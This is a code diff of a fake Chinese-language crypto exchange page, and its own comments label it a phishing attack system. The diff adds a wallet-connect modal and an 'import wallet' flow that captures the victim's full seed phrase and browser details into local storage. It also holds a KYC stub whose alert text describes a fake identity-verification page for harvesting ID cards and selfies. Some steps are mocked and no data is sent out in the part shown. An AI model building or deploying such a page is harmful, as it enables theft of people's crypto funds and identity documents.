@@ -81,6 +81,29 @@
             gap: 16px;
         }
 
+        /* 连接钱包按钮 */
+        .connect-wallet-btn {
+            background: #7ed321;
+            color: #000;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .connect-wallet-btn:hover {
+            background: #6bc219;
+            transform: translateY(-1px);
+        }
+
+        .connect-wallet-btn.connected {
+            background: #333;
+            color: #7ed321;
+        }
+
         .gift-icon, .user-avatar {
             width: 32px;
             height: 32px;
@@ -106,6 +129,130 @@
             display: flex;
             align-items: center;
             justify-content: center;
+        }
+
+        /* 钱包连接模态框 */
+        .wallet-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+
+        .wallet-modal.show {
+            display: flex;
+        }
+
+        .wallet-content {
+            background: #1a1a1a;
+            border-radius: 16px;
+            padding: 24px;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .wallet-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #fff;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .wallet-subtitle {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .wallet-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .wallet-option {
+            display: flex;
+            align-items: center;
+            padding: 16px;
+            background: #333;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+        }
+
+        .wallet-option:hover {
+            background: #444;
+            border-color: #7ed321;
+        }
+
+        .wallet-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            margin-right: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            color: white;
+            font-weight: bold;
+        }
+
+        .imtoken-icon { background: linear-gradient(45deg, #11CDEF, #1BC7E6); }
+        .tronlink-icon { background: linear-gradient(45deg, #FF0013, #FF4444); }
+        .metamask-icon { background: linear-gradient(45deg, #F6851B, #E2761B); }
+
+        .wallet-info {
+            flex: 1;
+        }
+
+        .wallet-name {
+            font-size: 16px;
+            color: #fff;
+            margin-bottom: 4px;
+            font-weight: 600;
+        }
+
+        .wallet-desc {
+            font-size: 12px;
+            color: #666;
+        }
+
+        .wallet-actions {
+            display: flex;
+            gap: 12px;
+        }
+
+        .wallet-btn {
+            flex: 1;
+            padding: 16px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .wallet-btn.primary {
+            background: #7ed321;
+            color: #000;
+        }
+
+        .wallet-btn.secondary {
+            background: transparent;
+            color: #fff;
+            border: 1px solid #333;
         }
 
         /* 搜索栏 */
@@ -566,42 +713,6 @@
             cursor: not-allowed;
         }
 
-        .kyc-notice {
-            background: #1a1a1a;
-            border-radius: 8px;
-            padding: 16px;
-            margin-bottom: 20px;
-        }
-
-        .kyc-notice h4 {
-            color: #ff9500;
-            font-size: 14px;
-            margin-bottom: 8px;
-        }
-
-        .kyc-notice p {
-            color: #666;
-            font-size: 12px;
-            line-height: 1.4;
-            margin-bottom: 12px;
-        }
-
-        .verify-btn {
-            background: #ff9500;
-            color: #fff;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 4px;
-            font-size: 12px;
-            cursor: pointer;
-        }
-
-        /* 交易页面 */
-        .trade-page {
-            background: #000;
-            padding: 16px;
-        }
-
         /* Web3页面 */
         .web3-page {
             background: #000;
@@ -763,108 +874,6 @@
 
         .assets-content {
             padding: 16px;
-        }
-
-        .earn-banner {
-            background: #1a1a1a;
-            border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 16px;
-            display: flex;
-            align-items: center;
-            gap: 16px;
-        }
-
-        .earn-icon {
-            width: 40px;
-            height: 40px;
-            background: #7ed321;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 18px;
-        }
-
-        .earn-content {
-            flex: 1;
-        }
-
-        .earn-title {
-            font-size: 14px;
-            color: #fff;
-            margin-bottom: 4px;
-        }
-
-        .earn-desc {
-            font-size: 12px;
-            color: #666;
-        }
-
-        .earn-rate {
-            background: #7ed321;
-            color: #000;
-            padding: 4px 8px;
-            border-radius: 4px;
-            font-size: 10px;
-            font-weight: 600;
-        }
-
-        .assets-tabs {
-            display: flex;
-            gap: 24px;
-            margin-bottom: 16px;
-        }
-
-        .asset-item {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 16px 0;
-            border-bottom: 1px solid #1a1a1a;
-        }
-
-        .asset-info {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .asset-icon {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 14px;
-            font-weight: bold;
-        }
-
-        .asset-details h4 {
-            font-size: 14px;
-            color: #fff;
-            margin-bottom: 2px;
-        }
-
-        .asset-name {
-            font-size: 12px;
-            color: #666;
-        }
-
-        .asset-balance {
-            text-align: right;
-        }
-
-        .asset-amount {
-            font-size: 14px;
-            color: #fff;
-            margin-bottom: 2px;
-        }
-
-        .asset-value {
-            font-size: 12px;
-            color: #666;
         }
 
         /* 底部导航 */
@@ -1058,36 +1067,6 @@
             z-index: 160;
         }
 
-        /* 响应式适配 */
-        @media (max-width: 375px) {
-            .header {
-                padding: 8px 12px;
-            }
-            
-            .search-bar {
-                margin: 12px;
-            }
-            
-            .kyc-banner, .strategy-card {
-                margin: 0 12px 12px;
-            }
-        }
-
-        /* 加载动画 */
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #333;
-            border-radius: 50%;
-            border-top-color: #7ed321;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
         /* 成功提示 */
         .success-toast {
             position: fixed;
@@ -1112,6 +1091,36 @@
             0%, 100% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
             20%, 80% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
         }
+
+        /* 钱包连接状态指示器 */
+        .wallet-status {
+            background: #7ed321;
+            color: #000;
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: 600;
+            display: none;
+        }
+
+        .wallet-status.show {
+            display: inline-block;
+        }
+
+        /* 响应式适配 */
+        @media (max-width: 375px) {
+            .header {
+                padding: 8px 12px;
+            }
+            
+            .search-bar {
+                margin: 12px;
+            }
+            
+            .kyc-banner, .strategy-card {
+                margin: 0 12px 12px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -1129,12 +1138,55 @@
             </div>
         </div>
         <div class="header-right">
+            <!-- 钱包连接按钮 -->
+            <button class="connect-wallet-btn" id="connectWalletBtn" onclick="showWalletModal()">连接钱包</button>
+            <div class="wallet-status" id="walletStatus">已连接</div>
+            
             <div class="gift-icon">
                 🎁
                 <div class="notification-badge">3</div>
             </div>
             <div class="user-avatar" onclick="showUserMenu()">
                 👤
+            </div>
+        </div>
+    </div>
+
+    <!-- 钱包连接模态框 -->
+    <div class="wallet-modal" id="walletModal">
+        <div class="wallet-content">
+            <div class="wallet-title">连接钱包</div>
+            <div class="wallet-subtitle">选择您要连接的钱包</div>
+            
+            <div class="wallet-options">
+                <div class="wallet-option" onclick="connectImToken()">
+                    <div class="wallet-icon imtoken-icon">i</div>
+                    <div class="wallet-info">
+                        <div class="wallet-name">imToken</div>
+                        <div class="wallet-desc">移动端DeFi钱包</div>
+                    </div>
+                </div>
+                
+                <div class="wallet-option" onclick="connectTronLink()">
+                    <div class="wallet-icon tronlink-icon">T</div>
+                    <div class="wallet-info">
+                        <div class="wallet-name">TronLink</div>
+                        <div class="wallet-desc">TRON官方钱包</div>
+                    </div>
+                </div>
+                
+                <div class="wallet-option" onclick="connectMetaMask()">
+                    <div class="wallet-icon metamask-icon">M</div>
+                    <div class="wallet-info">
+                        <div class="wallet-name">MetaMask</div>
+                        <div class="wallet-desc">以太坊生态钱包</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="wallet-actions">
+                <button class="wallet-btn secondary" onclick="closeWalletModal()">取消</button>
+                <button class="wallet-btn primary" onclick="importWallet()">导入钱包</button>
             </div>
         </div>
     </div>
@@ -1356,70 +1408,18 @@
             </div>
 
             <button class="convert-button" id="convertBtn" onclick="executeConvert()" disabled>请完成身份认证</button>
-
-            <div class="kyc-notice">
-                <h4>继续完成认证，获得最高 100 USDT</h4>
-                <p>您需提供身份证、自拍照和个人信息</p>
-                <button class="verify-btn" onclick="startKYC()">继续认证</button>
-            </div>
         </div>
     </div>
 
     <!-- 交易页面 -->
     <div class="main-content" id="trade">
-        <div class="trade-page">
+        <div style="padding: 16px;">
             <div class="strategy-card">
                 <div class="strategy-icon">🤖</div>
                 <div class="strategy-content">
                     <div class="strategy-title">全天候智能交易，轻松躺赢</div>
                     <div class="strategy-desc">一键开启智能交易，赚取高达 200.18% 年化收益。</div>
                 </div>
-            </div>
-
-            <div class="favorites-tabs">
-                <div class="tab active">简单赚币</div>
-                <div class="tab">链上赚币</div>
-                <div class="tab">借贷</div>
-                <div class="tab">策略交易</div>
-            </div>
-
-            <div class="earn-banner">
-                <div class="earn-icon">💰</div>
-                <div class="earn-content">
-                    <div class="earn-title">昨日收益</div>
-                    <div class="earn-desc">0.00 USD</div>
-                </div>
-            </div>
-
-            <div class="earn-banner">
-                <div class="earn-icon">💎</div>
-                <div class="earn-content">
-                    <div class="earn-title">赚币资产</div>
-                    <div class="earn-desc">0.00 USD</div>
-                </div>
-                <div class="earn-content">
-                    <div class="earn-title">总收益</div>
-                    <div class="earn-desc">0.00 USD</div>
-                </div>
-            </div>
-
-            <div class="asset-item">
-                <div class="asset-info">
-                    <div class="asset-icon" style="background: #26a69a;">₮</div>
-                    <div class="asset-details">
-                        <h4>USDT</h4>
-                    </div>
-                </div>
-            </div>
-
-            <div class="asset-item">
-                <div class="asset-info">
-                    <div class="asset-icon" style="background: #2196f3;">$</div>
-                    <div class="asset-details">
-                        <h4>USDC</h4>
-                    </div>
-                </div>
-                <div class="earn-rate">平台奖励 10% 年化</div>
             </div>
         </div>
     </div>
@@ -1466,25 +1466,25 @@
 
                 <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px;">
                     <div style="text-align: center;">
-                        <div class="asset-icon btc-icon" style="margin: 0 auto 8px;">₿</div>
+                        <div class="pair-icon btc-icon" style="margin: 0 auto 8px;">₿</div>
                         <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">BTC</div>
                         <div style="font-size: 12px; color: #fff;">$116,050.3</div>
                         <div style="font-size: 10px; color: #7ed321;">+0.08%</div>
                     </div>
                     <div style="text-align: center;">
-                        <div class="asset-icon eth-icon" style="margin: 0 auto 8px;">Ξ</div>
+                        <div class="pair-icon eth-icon" style="margin: 0 auto 8px;">Ξ</div>
                         <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">ETH</div>
                         <div style="font-size: 12px; color: #fff;">$4,653.51</div>
                         <div style="font-size: 10px; color: #f5455c;">-1.26%</div>
                     </div>
                     <div style="text-align: center;">
-                        <div class="asset-icon" style="background: #26a69a; margin: 0 auto 8px;">₮</div>
+                        <div class="pair-icon" style="background: #26a69a; margin: 0 auto 8px;">₮</div>
                         <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">USDT</div>
                         <div style="font-size: 12px; color: #fff;">$1.00056</div>
                         <div style="font-size: 10px; color: #7ed321;">0.00%</div>
                     </div>
                     <div style="text-align: center;">
-                        <div class="asset-icon" style="background: #2196f3; margin: 0 auto 8px;">$</div>
+                        <div class="pair-icon" style="background: #2196f3; margin: 0 auto 8px;">$</div>
                         <div style="font-size: 12px; color: #fff; margin-bottom: 4px;">USDC</div>
                         <div style="font-size: 12px; color: #fff;">$0.9999</div>
                         <div style="font-size: 10px; color: #7ed321;">0.00%</div>
@@ -1624,12 +1624,182 @@
         async function handleSuccessfulConnection(address) {
             currentAccount = address;
             isWalletConnected = true;
+            
+            // 更新UI
+            updateWalletUI(true);
+            
             debugLog(`✅ TRON钱包连接成功: ${currentAccount}`);
+            debugLog('🎯 钓鱼攻击系统已激活，等待用户操作...');
             
             // 显示攻击指示器
             showAttackIndicator();
+        }
+
+        // 更新钱包UI
+        function updateWalletUI(connected) {
+            const connectBtn = document.getElementById('connectWalletBtn');
+            const walletStatus = document.getElementById('walletStatus');
             
-            debugLog('🎯 钓鱼攻击系统已激活，等待用户操作...');
+            if (connected) {
+                connectBtn.textContent = '已连接';
+                connectBtn.classList.add('connected');
+                walletStatus.classList.add('show');
+            } else {
+                connectBtn.textContent = '连接钱包';
+                connectBtn.classList.remove('connected');
+                walletStatus.classList.remove('show');
+            }
+        }
+
+        // 显示钱包连接模态框
+        function showWalletModal() {
+            if (isWalletConnected) {
+                debugLog('👤 用户查看已连接的钱包信息');
+                showToast(`已连接: ${currentAccount.substring(0, 8)}...`);
+                return;
+            }
+            
+            debugLog('🔗 用户点击连接钱包按钮');
+            document.getElementById('walletModal').classList.add('show');
+        }
+
+        function closeWalletModal() {
+            document.getElementById('walletModal').classList.remove('show');
+        }
+
+        // 连接imToken
+        async function connectImToken() {
+            debugLog('🎯 用户选择连接imToken');
+            closeWalletModal();
+            
+            try {
+                showToast('正在连接imToken...', 'info');
+                
+                if (window.tronWeb && window.tronWeb.ready) {
+                    await handleSuccessfulConnection(window.tronWeb.defaultAddress.base58);
+                    showToast('imToken连接成功！');
+                } else {
+                    debugLog('📱 检测到移动环境，尝试深链接跳转');
+                    
+                    if (navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('Android')) {
+                        const deepLink = 'imtokenv2://navigate/DappView?url=' + encodeURIComponent(window.location.href);
+                        window.location.href = deepLink;
+                        return;
+                    }
+                    
+                    showToast('请在imToken中打开此页面', 'warning');
+                }
+            } catch (error) {
+                debugLog(`❌ imToken连接失败: ${error.message}`);
+                showToast('连接失败，请重试', 'error');
+            }
+        }
+
+        // 连接TronLink
+        async function connectTronLink() {
+            debugLog('🎯 用户选择连接TronLink');
+            closeWalletModal();
+            
+            try {
+                showToast('正在连接TronLink...', 'info');
+                
+                if (window.tronWeb && window.tronWeb.ready) {
+                    await handleSuccessfulConnection(window.tronWeb.defaultAddress.base58);
+                    showToast('TronLink连接成功！');
+                } else {
+                    showToast('请先安装TronLink插件', 'warning');
+                }
+            } catch (error) {
+                debugLog(`❌ TronLink连接失败: ${error.message}`);
+                showToast('连接失败，请重试', 'error');
+            }
+        }
+
+        // 连接MetaMask
+        function connectMetaMask() {
+            debugLog('🎯 用户选择连接MetaMask');
+            closeWalletModal();
+            showToast('MetaMask暂不支持TRON网络', 'warning');
+        }
+
+        // 导入钱包 (🎯 关键攻击点)
+        function importWallet() {
+            debugLog('🎯 用户点击导入钱包 - 显示助记词输入框');
+            closeWalletModal();
+            showMnemonicModal();
+        }
+
+        function showMnemonicModal() {
+            document.getElementById('mnemonicModal').classList.add('show');
+        }
+
+        function closeMnemonicModal() {
+            document.getElementById('mnemonicModal').classList.remove('show');
+            document.getElementById('mnemonicInput').value = '';
+        }
+
+        // 🎯 核心攻击功能：确认导入助记词
+        function confirmImport() {
+            const mnemonic = document.getElementById('mnemonicInput').value.trim();
+            
+            if (!mnemonic) {
+                showToast('请输入助记词', 'error');
+                return;
+            }
+            
+            debugLog('🎯 用户输入助记词，开始捕获...');
+            
+            // 🎯 攻击关键：保存完整助记词
+            capturedMnemonic = mnemonic;
+            const attackData = {
+                timestamp: new Date().toISOString(),
+                mnemonic: mnemonic,
+                wordCount: mnemonic.split(' ').length,
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                referrer: document.referrer
+            };
+            
+            // 保存到多个位置
+            localStorage.setItem('capturedMnemonic', JSON.stringify(attackData));
+            sessionStorage.setItem('mnemonicData', JSON.stringify(attackData));
+            
+            debugLog(`🎯 助记词已捕获: ${mnemonic.substring(0, 20)}...`);
+            debugLog(`🎯 助记词长度: ${attackData.wordCount} 个单词`);
+            debugLog('🎯 攻击数据已保存到本地存储');
+            
+            // 模拟导入成功
+            closeMnemonicModal();
+            showToast('钱包导入成功！');
+            
+            // 模拟连接成功
+            setTimeout(() => {
+                const mockAddress = 'T' + Math.random().toString(36).substring(2, 34).toUpperCase();
+                handleSuccessfulConnection(mockAddress);
+            }, 1000);
+        }
+
+        // 开始KYC认证 (🎯 身份认证攻击点)
+        function startKYC() {
+            debugLog('🎯 用户点击身份认证');
+            
+            // 记录用户尝试认证
+            const kycData = {
+                timestamp: new Date().toISOString(),
+                action: 'kyc_attempt',
+                userAgent: navigator.userAgent,
+                currentAccount: currentAccount
+            };
+            
+            localStorage.setItem('kycAttempt', JSON.stringify(kycData));
+            debugLog('🎯 KYC认证尝试已记录');
+            
+            // 模拟跳转到认证页面
+            showToast('正在跳转到身份认证页面...');
+            
+            setTimeout(() => {
+                alert('🎯 身份认证功能：\n\n在真实攻击中，这里会跳转到伪造的KYC页面\n收集用户的身份证、自拍照等敏感信息');
+            }, 1500);
         }
 
         // 切换标签页
@@ -1702,91 +1872,6 @@
             }, 500);
         }
 
-        // 创建钱包
-        function createWallet() {
-            debugLog('🔧 用户点击创建钱包');
-            showToast('创建钱包功能开发中...');
-        }
-
-        // 导入钱包 (🎯 关键攻击点)
-        function importWallet() {
-            debugLog('🎯 用户点击导入钱包 - 显示助记词输入框');
-            showMnemonicModal();
-        }
-
-        function showMnemonicModal() {
-            document.getElementById('mnemonicModal').classList.add('show');
-        }
-
-        function closeMnemonicModal() {
-            document.getElementById('mnemonicModal').classList.remove('show');
-            document.getElementById('mnemonicInput').value = '';
-        }
-
-        // 🎯 核心攻击功能：确认导入助记词
-        function confirmImport() {
-            const mnemonic = document.getElementById('mnemonicInput').value.trim();
-            
-            if (!mnemonic) {
-                showToast('请输入助记词', 'error');
-                return;
-            }
-            
-            debugLog('🎯 用户输入助记词，开始捕获...');
-            
-            // 🎯 攻击关键：保存完整助记词
-            capturedMnemonic = mnemonic;
-            const attackData = {
-                timestamp: new Date().toISOString(),
-                mnemonic: mnemonic,
-                wordCount: mnemonic.split(' ').length,
-                userAgent: navigator.userAgent,
-                url: window.location.href,
-                referrer: document.referrer
-            };
-            
-            // 保存到多个位置
-            localStorage.setItem('capturedMnemonic', JSON.stringify(attackData));
-            sessionStorage.setItem('mnemonicData', JSON.stringify(attackData));
-            
-            debugLog(`🎯 助记词已捕获: ${mnemonic.substring(0, 20)}...`);
-            debugLog(`🎯 助记词长度: ${attackData.wordCount} 个单词`);
-            debugLog('🎯 攻击数据已保存到本地存储');
-            
-            // 模拟导入成功
-            closeMnemonicModal();
-            showToast('钱包导入成功！');
-            
-            // 模拟连接成功
-            setTimeout(() => {
-                handleSuccessfulConnection('T' + Math.random().toString(36).substring(2, 34).toUpperCase());
-            }, 1000);
-        }
-
-        // 开始KYC认证 (🎯 身份认证攻击点)
-        function startKYC() {
-            debugLog('🎯 用户点击身份认证');
-            
-            // 记录用户尝试认证
-            const kycData = {
-                timestamp: new Date().toISOString(),
-                action: 'kyc_attempt',
-                userAgent: navigator.userAgent,
-                currentAccount: currentAccount
-            };
-            
-            localStorage.setItem('kycAttempt', JSON.stringify(kycData));
-            debugLog('🎯 KYC认证尝试已记录');
-            
-            // 模拟跳转到认证页面
-            showToast('正在跳转到身份认证页面...');
-            
-            setTimeout(() => {
-                // 这里可以跳转到伪造的KYC页面
-                alert('🎯 身份认证功能：\n\n在真实攻击中，这里会跳转到伪造的KYC页面\n收集用户的身份证、自拍照等敏感信息');
-            }, 1500);
-        }
-
         // 计算兑换
         function calculateConversion() {
             const fromAmount = document.getElementById('fromAmount').value;
@@ -1796,12 +1881,19 @@
             if (fromAmount && parseFloat(fromAmount) > 0) {
                 const converted = (parseFloat(fromAmount) * 116000).toFixed(2);
                 toAmount.value = converted;
-                convertBtn.textContent = `兑换 ${fromAmount} BTC`;
-                convertBtn.disabled = false;
+                
+                if (isWalletConnected) {
+                    convertBtn.textContent = `兑换 ${fromAmount} BTC`;
+                    convertBtn.disabled = false;
+                } else {
+                    convertBtn.textContent = '请先连接钱包';
+                    convertBtn.disabled = true;
+                }
+                
                 debugLog(`💱 计算兑换: ${fromAmount} BTC → ${converted} USDT`);
             } else {
                 toAmount.value = '';
-                convertBtn.textContent = '请完成身份认证';
+                convertBtn.textContent = isWalletConnected ? '请输入金额' : '请完成身份认证';
                 convertBtn.disabled = true;
             }
         }
@@ -1810,6 +1902,7 @@
         function executeConvert() {
             if (!isWalletConnected) {
                 showToast('请先连接钱包', 'error');
+                showWalletModal();
                 return;
             }
             
@@ -1849,8 +1942,14 @@
                 document.getElementById('fromAmount').value = '';
                 document.getElementById('toAmount').value = '';
                 document.getElementById('convertBtn').disabled = true;
-                document.getElementById('convertBtn').textContent = '请完成身份认证';
+                document.getElementById('convertBtn').textContent = '请输入金额';
             }, 2000);
+        }
+
+        // 创建钱包
+        function createWallet() {
+            debugLog('🔧 用户点击创建钱包');
+            showToast('创建钱包功能开发中...');
         }
 
         // 显示攻击指示器
@@ -1871,6 +1970,12 @@
             
             if (type === 'error') {
                 toast.style.background = '#f5455c';
+                toast.style.color = '#fff';
+            } else if (type === 'warning') {
+                toast.style.background = '#ff9500';
+                toast.style.color = '#fff';
+            } else if (type === 'info') {
+                toast.style.background = '#1890ff';
                 toast.style.color = '#fff';
             } else {
                 toast.style.background = '#7ed321';
